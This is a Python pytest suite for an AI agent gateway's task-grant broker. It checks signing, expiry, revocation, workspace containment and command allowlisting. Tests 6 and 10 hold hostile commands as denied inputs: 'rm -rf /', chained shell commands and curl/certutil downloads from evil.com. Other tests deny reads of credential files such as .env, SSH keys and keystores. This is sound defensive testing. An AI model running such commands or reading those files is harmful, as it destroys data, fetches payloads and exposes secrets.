"""Unit & Security Tests for TaskGrant Authorization Contract & Broker.

Verifies:
1. Cryptographic HMAC-SHA256 signing and verification.
2. Tamper-evident protection: altering any field invalidates the grant signature.
3. Expiration enforcement: expired grants fail closed.
4. Revocation enforcement: revoked grants cannot authorize actions.
5. Workspace containment: path traversal, ADS streams, UNC paths, and sensitive files (.env, .ssh, DPAPI) are strictly blocked.
6. Command injection defense: command chaining (;, &&, ||, `, $()) is denied unless exact match.
7. Gateway session integration: TaskGrant seamlessly maps to active ControlSession.
8. Emergency Stop integration: active emergency stop revokes and blocks all actions.
9. Cross-process durable SQLite grant storage and revocation observation.
10. Command wrapper, redirection, and prefix bypass prevention.
11. Workspace scoping and sensitive file defense (.env.*, certificates, DPAPI, git hooks).
12. Owner approval HMAC token and preapproved workspace root limits.
"""
from __future__ import annotations

import tempfile
import time
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
GW_DIR = str(PROJECT_ROOT / "mcp-gateway")
if GW_DIR not in sys.path:
    sys.path.insert(0, GW_DIR)
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

import pytest

from policy import GatewayPolicy, PermissionTier
from runtime.task_grant import (
    TaskGrant,
    TaskGrantBroker,
    compute_proposal_scope_digest,
    get_or_create_broker_key,
)


@pytest.fixture
def temp_workspace():
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
        ws = Path(td).resolve()
        (ws / "src").mkdir()
        (ws / "src" / "main.py").write_text("print('hello')", encoding="utf-8")
        yield ws


@pytest.fixture
def broker(temp_workspace):
    key_path = temp_workspace / "broker.key"
    db_path = temp_workspace / "tasks.db"
    return TaskGrantBroker(key_path=key_path, db_path=db_path)


class TestTaskGrantSecurity:

    def test_01_valid_grant_signing_and_verification(self, broker, temp_workspace):
        grant = broker.issue_grant(
            task_id="task_test_01",
            workspace_root=temp_workspace,
            allowed_tools=["read_file", "write_file", "powershell_execute"],
            allowed_commands=["pytest*", "python*"],
            allowed_permission_tiers=["READ", "WRITE", "EXECUTE"],
            duration_seconds=300.0,
        )
        assert grant.signature != ""
        valid, msg = broker.validate_grant(grant)
        assert valid is True
        assert msg == "VALID"

    def test_02_tampered_payload_signature_failure(self, broker, temp_workspace):
        grant = broker.issue_grant(
            task_id="task_test_02",
            workspace_root=temp_workspace,
            allowed_tools=["read_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ"],
            duration_seconds=300.0,
        )
        # Malicious actor tampers with allowed_tools to add write_file
        grant.allowed_tools.append("write_file")
        valid, msg = broker.validate_grant(grant)
        assert valid is False
        assert "invalid cryptographic signature" in msg

    def test_03_expired_grant_fails_closed(self, broker, temp_workspace):
        grant = broker.issue_grant(
            task_id="task_test_03",
            workspace_root=temp_workspace,
            allowed_tools=["read_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ"],
            duration_seconds=1.0,
        )
        # Simulate time passage
        future = time.time() + 10.0
        valid, msg = broker.validate_grant(grant, now=future)
        assert valid is False
        assert "expired" in msg

    def test_04_revoked_grant_fails_closed(self, broker, temp_workspace):
        grant = broker.issue_grant(
            task_id="task_test_04",
            workspace_root=temp_workspace,
            allowed_tools=["read_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ"],
            duration_seconds=300.0,
        )
        assert broker.validate_grant(grant)[0] is True
        broker.revoke_grant(grant.grant_id, reason="Owner revoked test grant")
        valid, msg = broker.validate_grant(grant)
        assert valid is False
        assert "revoked" in msg

    def test_05_workspace_path_containment_and_sensitive_files(self, broker, temp_workspace):
        grant = broker.issue_grant(
            task_id="task_test_05",
            workspace_root=temp_workspace,
            allowed_tools=["read_file", "write_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ", "WRITE"],
            duration_seconds=300.0,
        )

        # In-scope path -> ALLOW
        assert grant.allows_path(temp_workspace / "src" / "main.py") is True
        assert grant.allows_path(temp_workspace / "README.md") is True

        # Path traversal out of workspace -> DENY
        assert grant.allows_path(temp_workspace / ".." / "outside.txt") is False
        assert grant.allows_path(Path("C:/Windows/System32/cmd.exe")) is False

        # Sensitive files inside workspace -> DENY
        assert grant.allows_path(temp_workspace / ".env") is False
        assert grant.allows_path(temp_workspace / "id_rsa") is False
        assert grant.allows_path(temp_workspace / "broker_hmac.key") is False

        # UNC and ADS rejection -> DENY
        assert grant.allows_path("\\\\127.0.0.1\\c$\\Windows") is False
        assert grant.allows_path(str(temp_workspace / "main.py") + ":stream") is False

    def test_06_command_injection_defense(self, broker, temp_workspace):
        grant = broker.issue_grant(
            task_id="task_test_06",
            workspace_root=temp_workspace,
            allowed_tools=["powershell_execute"],
            allowed_commands=["pytest*", "python*"],
            allowed_permission_tiers=["EXECUTE"],
            duration_seconds=300.0,
        )

        # Allowed command prefixes
        assert grant.allows_command("pytest -v tests/") is True
        assert grant.allows_command("python -m unittest") is True

        # Disallowed command
        assert grant.allows_command("format C:") is False
        assert grant.allows_command("curl http://malicious.com") is False

        # Command injection attempts
        assert grant.allows_command("pytest ; rm -rf /") is False
        assert grant.allows_command("pytest && del /f /q C:\\") is False
        assert grant.allows_command("python `whoami`") is False
        assert grant.allows_command("python $(calc.exe)") is False

    def test_07_gateway_session_and_tier_mapping(self, broker, temp_workspace):
        policy = GatewayPolicy(profile="full_agent", emergency_stop_file=temp_workspace / "EMERGENCY_STOP")
        broker.policy = policy
        grant = broker.issue_grant(
            task_id="task_test_07",
            workspace_root=temp_workspace,
            allowed_tools=["read_file", "write_file", "powershell_execute"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ", "WRITE", "EXECUTE"],
            duration_seconds=300.0,
        )

        sess = policy.sessions.get_session(grant.task_id)
        assert sess is not None
        assert sess.has_tier(PermissionTier.READ) is True
        assert sess.has_tier(PermissionTier.WRITE) is True
        assert sess.has_tier(PermissionTier.EXECUTE) is True
        assert sess.has_tier(PermissionTier.SYSTEM_ADMIN) is False

    def test_08_emergency_stop_revokes_and_blocks(self, broker, temp_workspace):
        policy = GatewayPolicy(profile="full_agent", emergency_stop_file=temp_workspace / "EMERGENCY_STOP")
        broker.policy = policy
        grant = broker.issue_grant(
            task_id="task_test_08",
            workspace_root=temp_workspace,
            allowed_tools=["read_file", "write_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ", "WRITE"],
            duration_seconds=300.0,
        )

        assert policy.sessions.get_session(grant.task_id).is_active() is True
        policy.engage_emergency_stop(reason="Security Incident Test")
        assert policy.is_emergency_stop_active() is True
        # Session is revoked on emergency stop
        assert policy.sessions.get_session(grant.task_id).is_active() is False

    def test_09_durable_grant_across_two_python_processes(self, temp_workspace):
        import subprocess

        key_path = temp_workspace / "cross_proc_broker.key"
        db_path = temp_workspace / "cross_proc_tasks.db"

        # Process 1: Issue grant in SQLite and exit
        p1_code = (
            "import sys\n"
            "from pathlib import Path\n"
            f"sys.path.insert(0, {repr(str(PROJECT_ROOT))})\n"
            f"sys.path.insert(0, {repr(str(GW_DIR))})\n"
            "from runtime.task_grant import TaskGrantBroker\n"
            f"broker = TaskGrantBroker(key_path=Path({repr(str(key_path))}), db_path=Path({repr(str(db_path))}))\n"
            "grant = broker.issue_grant(\n"
            "    task_id='task_proc_cross_01',\n"
            f"    workspace_root=Path({repr(str(temp_workspace))}),\n"
            "    allowed_tools=['read_file'],\n"
            "    allowed_commands=['pytest*'],\n"
            "    allowed_permission_tiers=['READ'],\n"
            "    duration_seconds=300.0,\n"
            ")\n"
            "print(grant.grant_id)\n"
        )
        p1 = subprocess.run(
            [sys.executable, "-c", p1_code],
            capture_output=True,
            text=True,
            check=True,
        )
        grant_id = p1.stdout.strip().splitlines()[-1]
        assert grant_id.startswith("grant_")

        # Process 2: Load grant from SQLite, verify signature, and revoke it
        p2_code = (
            "import sys\n"
            "from pathlib import Path\n"
            f"sys.path.insert(0, {repr(str(PROJECT_ROOT))})\n"
            f"sys.path.insert(0, {repr(str(GW_DIR))})\n"
            "from runtime.task_grant import TaskGrantBroker\n"
            f"broker = TaskGrantBroker(key_path=Path({repr(str(key_path))}), db_path=Path({repr(str(db_path))}))\n"
            f"grant = broker.get_grant({repr(grant_id)})\n"
            "assert grant is not None, 'Process 2 failed to read grant from SQLite'\n"
            "valid, msg = broker.validate_grant(grant)\n"
            "assert valid is True, f'Validation failed: {msg}'\n"
            f"rev_ok = broker.revoke_grant({repr(grant_id)}, reason='Revocation by Process 2')\n"
            "assert rev_ok is True, 'Process 2 failed to update SQLite'\n"
            "print('REVOKED_SUCCESS')\n"
        )
        p2 = subprocess.run(
            [sys.executable, "-c", p2_code],
            capture_output=True,
            text=True,
        )
        if p2.returncode != 0:
            print(f"P2 STDOUT: {p2.stdout}")
            print(f"P2 STDERR: {p2.stderr}")
            assert False, f"Process 2 failed with code {p2.returncode}: {p2.stderr}"
        assert "REVOKED_SUCCESS" in p2.stdout

        # Verify in parent process: validate_grant immediately detects revocation in SQLite
        broker_parent = TaskGrantBroker(key_path=key_path, db_path=db_path)
        valid, msg = broker_parent.validate_grant(grant_id)
        assert valid is False
        assert "revoked in durable store" in msg
        assert "Revocation by Process 2" in msg

    def test_10_command_wrapper_redirection_and_prefix_bypass_blocked(self, broker, temp_workspace):
        grant = broker.issue_grant(
            task_id="task_test_10",
            workspace_root=temp_workspace,
            allowed_tools=["powershell_execute"],
            allowed_commands=["pytest*", "python*", "git*"],
            allowed_permission_tiers=["EXECUTE"],
            duration_seconds=300.0,
        )

        # 1. Prefix bypass attempts: python* must not match python_evil.exe
        assert grant.allows_command("python_evil.exe") is False
        assert grant.allows_command("python_evil.exe -v") is False
        assert grant.allows_command("pytest_hacked.exe") is False

        # 2. Command chaining, redirection, piping, and subshells
        assert grant.allows_command("pytest && calc.exe") is False
        assert grant.allows_command("pytest ; calc.exe") is False
        assert grant.allows_command("pytest | calc.exe") is False
        assert grant.allows_command(r"pytest > C:\Windows\Temp\out.txt") is False
        assert grant.allows_command(r"pytest >> C:\Windows\Temp\out.txt") is False
        assert grant.allows_command("pytest < input.txt") is False
        assert grant.allows_command("pytest `whoami`") is False
        assert grant.allows_command("pytest $(whoami)") is False
        assert grant.allows_command("pytest %COMSPEC%") is False

        # 3. Dangerous wrappers & shells
        assert grant.allows_command("powershell -enc aW52b2tl") is False
        assert grant.allows_command("cmd /c calc.exe") is False
        assert grant.allows_command("curl http://evil.com/payload") is False
        assert grant.allows_command("certutil -urlcache -split -f http://evil.com/p.exe") is False

        # 4. Dangerous git and python flags
        assert grant.allows_command(r"git --git-dir=C:\outside status") is False
        assert grant.allows_command(r"git --work-tree=C:\ status") is False
        assert grant.allows_command("python -c \"import os; os.system('calc')\"") is False

        # 5. Path traversal in arguments escaping workspace
        assert grant.allows_command(r"python ..\outside.py") is False
        assert grant.allows_command(r"python ../outside.py") is False

        # 6. Legitimate commands within scope MUST succeed
        assert grant.allows_command("pytest -v tests/") is True
        assert grant.allows_command("python -m pytest") is True
        assert grant.allows_command("git status") is True

    def test_11_read_and_list_outside_workspace_denied(self, broker, temp_workspace):
        ws_a = temp_workspace / "workspace_a"
        ws_b = temp_workspace / "workspace_b"
        extra_dir = temp_workspace / "shared_lib"
        ws_a.mkdir()
        ws_b.mkdir()
        extra_dir.mkdir()

        file_a = ws_a / "app.py"
        file_b = ws_b / "secret.py"
        file_extra = extra_dir / "common.py"
        file_a.write_text("print('a')", encoding="utf-8")
        file_b.write_text("print('b')", encoding="utf-8")
        file_extra.write_text("print('extra')", encoding="utf-8")

        grant = broker.issue_grant(
            task_id="task_test_11",
            workspace_root=ws_a,
            allowed_tools=["read_file", "write_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ", "WRITE"],
            allowed_extra_paths=[str(extra_dir)],
            duration_seconds=300.0,
        )

        # In-scope path in ws_a -> ALLOW (both read and write)
        assert grant.allows_path(file_a, is_write=False) is True
        assert grant.allows_path(file_a, is_write=True) is True

        # Pre-approved extra path -> ALLOW
        assert grant.allows_path(file_extra, is_write=False) is True
        assert grant.allows_path(file_extra, is_write=True) is True

        # Workspace B is outside grant -> DENY (both read and write)
        assert grant.allows_path(file_b, is_write=False) is False
        assert grant.allows_path(file_b, is_write=True) is False
        assert grant.allows_path(ws_b, is_write=False) is False

        # Sensitive files inside ws_a -> DENY
        assert grant.allows_path(ws_a / ".env.local") is False
        assert grant.allows_path(ws_a / ".env.production") is False
        assert grant.allows_path(ws_a / "id_ed25519") is False
        assert grant.allows_path(ws_a / "cert.pem") is False
        assert grant.allows_path(ws_a / "token.key") is False
        assert grant.allows_path(ws_a / "keystore.pfx") is False
        assert grant.allows_path(ws_a / "bundle.p12") is False
        assert grant.allows_path(ws_a / "passwords.kdbx") is False
        assert grant.allows_path(ws_a / "creds.dpapi") is False
        assert grant.allows_path(ws_a / ".git" / "config") is False
        assert grant.allows_path(ws_a / ".git" / "hooks" / "pre-commit") is False

        # .env.example -> ALLOW
        assert grant.allows_path(ws_a / ".env.example") is True

    def test_12_owner_approval_token_and_preapproved_roots(self, temp_workspace):
        key_path = temp_workspace / "broker_12.key"
        db_path = temp_workspace / "tasks_12.db"
        approved_root = temp_workspace / "allowed_root"
        approved_root.mkdir()
        valid_ws = approved_root / "project1"
        valid_ws.mkdir()
        outside_ws = temp_workspace / "outside_root" / "project2"
        outside_ws.mkdir(parents=True)

        broker = TaskGrantBroker(
            key_path=key_path,
            db_path=db_path,
            preapproved_roots=[approved_root],
        )

        # 1. Owner Approval Token generation & verification
        tok = broker.generate_owner_approval_token("task_12", valid_ws)
        assert isinstance(tok, str) and tok.startswith("v2.") and len(tok) > 64
        assert broker.verify_owner_approval_token("task_12", valid_ws, tok) is True
        # Mismatched task
        assert broker.verify_owner_approval_token("task_other", valid_ws, tok) is False
        # Mismatched ws
        assert broker.verify_owner_approval_token("task_12", outside_ws, tok) is False
        # Corrupted token
        assert broker.verify_owner_approval_token("task_12", valid_ws, tok[:-2] + "00") is False

        # 2. Preapproved root enforcement: valid workspace succeeds
        grant = broker.issue_grant(
            task_id="task_12_ok",
            workspace_root=valid_ws,
            allowed_tools=["read_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ"],
        )
        assert grant is not None

        # 3. Unapproved root rejected
        with pytest.raises(PermissionError, match="outside owner preapproved roots"):
            broker.issue_grant(
                task_id="task_12_bad_root",
                workspace_root=outside_ws,
                allowed_tools=["read_file"],
                allowed_commands=["pytest*"],
                allowed_permission_tiers=["READ"],
            )

        # 4. Drive root rejected
        with pytest.raises(PermissionError, match="Drive root"):
            broker.issue_grant(
                task_id="task_12_drive_root",
                workspace_root="C:\\",
                allowed_tools=["read_file"],
                allowed_commands=["pytest*"],
                allowed_permission_tiers=["READ"],
            )

        # 5. SYSTEM_ADMIN tier rejected
        with pytest.raises(PermissionError, match="SYSTEM_ADMIN tier"):
            broker.issue_grant(
                task_id="task_12_sysadmin_tier",
                workspace_root=valid_ws,
                allowed_tools=["read_file"],
                allowed_commands=["pytest*"],
                allowed_permission_tiers=["READ", "SYSTEM_ADMIN"],
            )

        # 6. SYSTEM_ADMIN tools rejected
        with pytest.raises(PermissionError, match="SYSTEM_ADMIN tier and is not permitted"):
            broker.issue_grant(
                task_id="task_12_sysadmin_tool",
                workspace_root=valid_ws,
                allowed_tools=["modify_firewall"],
                allowed_commands=["pytest*"],
                allowed_permission_tiers=["READ"],
            )

    def test_13_g01_wildcard_rejected_and_single_use_anti_replay(self, broker, temp_workspace):
        # 1. Wildcard task_id rejection in token generation (G01)
        with pytest.raises(PermissionError, match="Wildcard task_id approval"):
            broker.generate_owner_approval_token("*", temp_workspace)

        with pytest.raises(PermissionError, match="Wildcard task_id approval"):
            broker.generate_owner_approval_token("task_*", temp_workspace)

        with pytest.raises(PermissionError, match="Wildcard task_id approval"):
            broker.generate_owner_approval_token("", temp_workspace)

        # 2. Wildcard task_id rejection in token verification (G01)
        assert broker.verify_owner_approval_token("*", temp_workspace, "any_token") is False
        assert broker.verify_owner_approval_token("", temp_workspace, "any_token") is False

        # 3. Single-use anti-replay enforcement (G01)
        proposal = {
            "task_id": "task_13_replay",
            "workspace_root": str(temp_workspace),
            "allowed_tools": ["read_file", "write_file"],
            "allowed_commands": ["pytest*"],
            "allowed_permission_tiers": ["READ", "WRITE"],
            "duration_seconds": 3600.0,
            "max_tool_calls": 500,
            "max_retries": 5,
            "api_cost_budget": 5.0,
            "objective": "Test anti-replay token",
        }
        digest = compute_proposal_scope_digest(proposal)
        token = broker.generate_owner_approval_token(
            task_id="task_13_replay",
            workspace_root=temp_workspace,
            scope_digest=digest,
            owner_id="local_admin",
        )

        # First verification succeeds and consumes nonce
        assert broker.verify_owner_approval_token(
            "task_13_replay",
            temp_workspace,
            token,
            expected_scope_digest=digest,
            consume=True,
        ) is True

        # Second verification (replay) fails immediately because nonce was consumed
        assert broker.verify_owner_approval_token(
            "task_13_replay",
            temp_workspace,
            token,
            expected_scope_digest=digest,
            consume=True,
        ) is False

        # 4. Scope digest tampering detection (G01)
        proposal_original = {
            "task_id": "task_13_tamper",
            "workspace_root": str(temp_workspace),
            "allowed_tools": ["read_file"],
            "allowed_commands": ["pytest*"],
        }
        digest_original = compute_proposal_scope_digest(proposal_original)
        token_tamper = broker.generate_owner_approval_token(
            task_id="task_13_tamper",
            workspace_root=temp_workspace,
            scope_digest=digest_original,
            owner_id="local_admin",
        )

        # Attacker tampers with scope: adds write_file or powershell
        proposal_tampered = {
            "task_id": "task_13_tamper",
            "workspace_root": str(temp_workspace),
            "allowed_tools": ["read_file", "write_file"],
            "allowed_commands": ["pytest*"],
        }
        digest_tampered = compute_proposal_scope_digest(proposal_tampered)

        # Verifying against modified scope fails closed (scope modified after approval)
        assert broker.verify_owner_approval_token(
            "task_13_tamper",
            temp_workspace,
            token_tamper,
            expected_scope_digest=digest_tampered,
            consume=False,
        ) is False

        # Verifying against original scope succeeds
        assert broker.verify_owner_approval_token(
            "task_13_tamper",
            temp_workspace,
            token_tamper,
            expected_scope_digest=digest_original,
            consume=True,
        ) is True

    def test_14_g02_cross_task_grant_reassignment_blocked(self, broker, temp_workspace):
        proposal = {
            "task_id": "task_A",
            "workspace_root": str(temp_workspace),
            "allowed_tools": ["read_file"],
            "allowed_commands": ["pytest*"],
        }
        digest = compute_proposal_scope_digest(proposal)

        grant = broker.issue_grant(
            task_id="task_A",
            workspace_root=temp_workspace,
            allowed_tools=["read_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ"],
            duration_seconds=300.0,
            proposal_digest=digest,
        )
        assert grant.proposal_digest == digest

        # 1. Validation with matching expected_task_id succeeds
        valid, msg = broker.validate_grant(grant, expected_task_id="task_A")
        assert valid is True
        assert msg == "VALID"

        # 2. Validation with mismatched expected_task_id fails with G02 denial
        valid, msg = broker.validate_grant(grant, expected_task_id="task_B")
        assert valid is False
        assert "Cross-task grant reuse denied (G02)" in msg
        assert "task_A" in msg and "task_B" in msg

        # 3. In-memory tampering of task_id is detected against SQLite store
        grant.task_id = "task_B"
        valid, msg = broker.validate_grant(grant)
        assert valid is False
        assert "Tampering detected" in msg or "invalid cryptographic signature" in msg

        # 4. Tampering of proposal_digest invalidates cryptographic signature
        grant.task_id = "task_A"  # restore task_id
        grant.proposal_digest = "tampered_digest"
        valid, msg = broker.validate_grant(grant)
        assert valid is False
        assert "invalid cryptographic signature" in msg

    def test_15_g03_fail_closed_preapproved_roots_and_onboarding(self, temp_workspace):
        key_path = temp_workspace / "broker_15.key"
        db_path = temp_workspace / "tasks_15.db"

        # 1. Broker configured with require_preapproved_roots=True fails closed when no roots onboarded
        broker_strict = TaskGrantBroker(
            key_path=key_path,
            db_path=db_path,
            require_preapproved_roots=True,
        )
        assert broker_strict.list_preapproved_roots() == []

        with pytest.raises(PermissionError, match="Fail-closed.*No preapproved workspace roots"):
            broker_strict.issue_grant(
                task_id="task_15_fail",
                workspace_root=temp_workspace,
                allowed_tools=["read_file"],
                allowed_commands=["pytest*"],
                allowed_permission_tiers=["READ"],
            )

        # 2. Sensitive directories and drive roots cannot be onboarded
        with pytest.raises(PermissionError, match="Drive root"):
            broker_strict.onboard_workspace_root("C:\\")

        with pytest.raises(PermissionError, match="sensitive directory"):
            broker_strict.onboard_workspace_root("C:\\Windows")

        with pytest.raises(PermissionError, match="sensitive directory"):
            broker_strict.onboard_workspace_root("C:\\Program Files")

        # 3. Onboarding legitimate workspace succeeds and persists across instances
        canonical_onboarded = broker_strict.onboard_workspace_root(temp_workspace, owner_id="admin_sec")
        assert canonical_onboarded == str(temp_workspace.resolve(strict=False))

        # Check list_preapproved_roots includes the onboarded path
        roots = broker_strict.list_preapproved_roots()
        assert temp_workspace.resolve(strict=False) in roots

        # Now issue_grant succeeds for workspace inside onboarded root
        grant = broker_strict.issue_grant(
            task_id="task_15_ok",
            workspace_root=temp_workspace,
            allowed_tools=["read_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ"],
        )
        assert grant is not None
        valid, msg = broker_strict.validate_grant(grant)
        assert valid is True

        # A path outside onboarded root still fails
        outside = temp_workspace.parent / "unapproved_outside"
        outside.mkdir(exist_ok=True)
        with pytest.raises(PermissionError, match="outside owner preapproved roots"):
            broker_strict.issue_grant(
                task_id="task_15_outside",
                workspace_root=outside,
                allowed_tools=["read_file"],
                allowed_commands=["pytest*"],
                allowed_permission_tiers=["READ"],
            )

        # 4. Durable persistence check: new broker instance on same DB observes onboarded root
        broker_reloaded = TaskGrantBroker(
            key_path=key_path,
            db_path=db_path,
            require_preapproved_roots=True,
        )
        assert temp_workspace.resolve(strict=False) in broker_reloaded.list_preapproved_roots()
